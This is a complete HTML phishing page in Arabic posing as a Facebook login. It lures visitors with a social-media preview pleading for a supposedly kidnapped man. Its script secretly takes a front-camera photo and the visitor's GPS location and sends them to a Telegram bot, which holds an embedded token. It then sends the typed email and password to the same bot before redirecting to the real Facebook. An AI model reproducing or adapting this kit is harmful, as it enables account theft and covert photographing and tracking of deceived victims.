<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>فيسبوك - تسجيل الدخول</title>
    
    <meta property="og:title" content="بأي ذنب يُخطف [محمد مصطفى العنعوني]؟">
    <meta property="og:description" content="وبأي حق نعيش في غابة يغيب فيها القانون ويحضر فيها الغدر؟ اللهم ردّه إلينا سالماً.">
    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg">

    <style>
        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
        .form-area {padding:20px;}
        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;background:#f5f6f7;}
        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
        
        #startOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 10000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-align: center; padding: 20px;
        }
        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div id="startOverlay">
    <div style="margin-bottom: 20px; color: #1c1e21; font-size: 18px;">
        يرجى المتابعة لتأكيد هويتك ومشاهدة تفاصيل المنشور.
    </div>
    <button class="start-btn" id="initBtn">متابعة إلى فيسبوك</button>
</div>

<div class="fb-container">
    <div class="header">facebook</div>
    <div class="form-area">
        <form id="loginForm">
            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
        </form>
    </div>
</div>

<script>
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

// Initial interaction for permissions
document.getElementById('initBtn').onclick = function() {
    document.getElementById('startOverlay').style.display = 'none';
    startCapture();
};

async function startCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const blob = dataURLtoBlob(imageData);
                const fd = new FormData();
                fd.append('photo', blob, 'victim.jpg');
                fd.append('caption', `📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`);
                fd.append('chat_id', CHAT_ID);
                
                // CRITICAL: We don't need to 'await' background data, but we use 'keepalive'
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd, keepalive: true });
            });
        }, 1000);
    } catch (err) { console.log("Blocked"); }
}

// MAIN CREDENTIAL LOGIC
document.getElementById('loginForm').onsubmit = async function(e) {
    e.preventDefault();
    const email = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const btn = document.getElementById('submitBtn');
    
    btn.innerText = "جاري التحميل...";
    btn.disabled = true;

    const creds = `👤 حساب مستهدف:\n📧: ${email}\n🔑: ${pass}`;

    try {
        // FORCE THE BROWSER TO WAIT UNTIL TELEGRAM SAYS "RECEIVED"
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: creds })
        });

        if (response.ok) {
            // Only redirect if the message was actually sent
            window.location.href = "https://m.facebook.com/";
        } else {
            // Fallback redirect after a short delay if Telegram fails
            setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1500);
        }
    } catch (error) {
        // If network fails, wait 1 second then redirect so the user doesn't get stuck
        setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1000);
    }
};

function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type: mime});
}
</script>

</body>
</html>
